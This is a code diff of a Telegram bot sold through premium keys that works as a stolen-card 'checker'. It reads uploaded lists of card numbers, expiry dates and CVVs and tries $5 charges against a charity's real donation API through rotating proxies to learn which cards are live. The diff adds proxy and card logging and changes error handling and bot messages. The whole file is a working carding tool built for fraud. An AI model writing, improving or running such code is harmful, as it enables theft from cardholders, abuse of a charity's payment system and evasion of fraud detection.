@@ -38,7 +38,7 @@ async def save_json(filename, data):
         await f.write(json.dumps(data, indent=4))
 
 async def is_premium(user_id):
-    if int(user_id) == OWNER_ID:   # Owner always has access
+    if int(user_id) == OWNER_ID:
         return True
     data = await load_json(PREMIUM_FILE)
     uid = str(user_id)
@@ -64,29 +64,30 @@ async def redeem_key(user_id, key: str):
     premium = await load_json(PREMIUM_FILE)
     uid = str(user_id)
     key = key.strip().upper()
-    
     if key not in data or data[key].get("used"):
         return "❌ Invalid or already used key!"
-    
     days = data[key]["days"]
     expiry = datetime.now() + datetime.timedelta(days=days)
     premium[uid] = {"expiry": expiry.isoformat(), "plan": f"{days} days"}
     data[key]["used"] = True
-    data[key]["used_by"] = uid
-    data[key]["used_at"] = str(datetime.now())
-    
     await save_json(KEYS_FILE, data)
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== CHARGE FUNCTION ==================
+# ================== REAL CHECKER WITH PROXY ==================
 async def charge_5_dollars(card: str):
     try:
         cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
         if len(yy) == 2: yy = "20" + yy
 
-        proxy = random.choice(PROXIES)
-        proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
+        current_time = datetime.now().strftime('%H:%M:%S')
+        print(f"[{current_time}] CHECKING → {cc[:6]}******{cc[-4:]}")
+
+        # Select & Format Proxy
+        proxy_str = random.choice(PROXIES)
+        parts = proxy_str.split(':')
+        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        print(f"[{current_time}] USING PROXY → {parts[0]}:{parts[1]}")
 
         payload = {
             "amount": "5",
@@ -99,15 +100,19 @@ async def charge_5_dollars(card: str):
                 "https://weanimals.donorsupport.co/api/donate",
                 json=payload,
                 proxy=proxy_url,
-                timeout=30
+                timeout=35
             ) as r:
                 text = await r.text()
+                print(f"[{current_time}] RESPONSE: {r.status} | {text[:150]}")
+
                 if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged"]):
                     return {"status": "Approved", "response": "Card Added (succeeded)"}
                 else:
                     return {"status": "Declined", "response": "Declined"}
-    except:
-        return {"status": "Declined", "response": "Error"}
+
+    except Exception as e:
+        print(f"[{current_time}] ERROR: {e}")
+        return {"status": "Declined", "response": "Proxy Error"}
 
 # ================== BEAUTIFUL UI ==================
 async def send_approved(event, card, info):
@@ -128,18 +133,12 @@ async def send_approved(event, card, info):
 """
     await event.reply(msg)
 
-# ================== COMMANDS ==================
+# ================== BOT ==================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
 async def start(event):
     if not await is_premium(event.sender_id):
-        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate premium.")
-    await event.reply(
-        "**🔥 WeAnimals Media $5 Charge Checker**\n\n"
-        "Send `.txt` file with cards\n"
-        "Real GiveWP + Stripe\n"
-        "Proxy Protected\n\n"
-        "Owner: `/genkey <days>`"
-    )
+        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate.")
+    await event.reply("**🔥 WeAnimals $5 Charge Checker**\nSend `.txt` file")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
 async def genkey(event):
@@ -164,7 +163,7 @@ async def txt_handler(event):
     if not await is_premium(event.sender_id):
         return await event.reply("❌ No Access! Use /key first.")
 
-    await event.reply("📂 Processing TXT file...")
+    await event.reply("📂 Processing TXT file with Proxy...")
     path = f"temp_{event.sender_id}.txt"
     await event.download_media(path)
 
@@ -182,7 +181,7 @@ async def txt_handler(event):
     if not cards:
         return await event.reply("❌ No valid cards!")
 
-    await event.reply(f"✅ Found **{len(cards)}** cards. Starting...")
+    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check with Proxy...")
 
     for card in cards:
         result = await charge_5_dollars(card)
@@ -193,7 +192,7 @@ async def txt_handler(event):
         await asyncio.sleep(6)
 
 async def main():
-    print("🚀 Bot Started Successfully")
+    print("🚀 Bot Started with Proxy")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
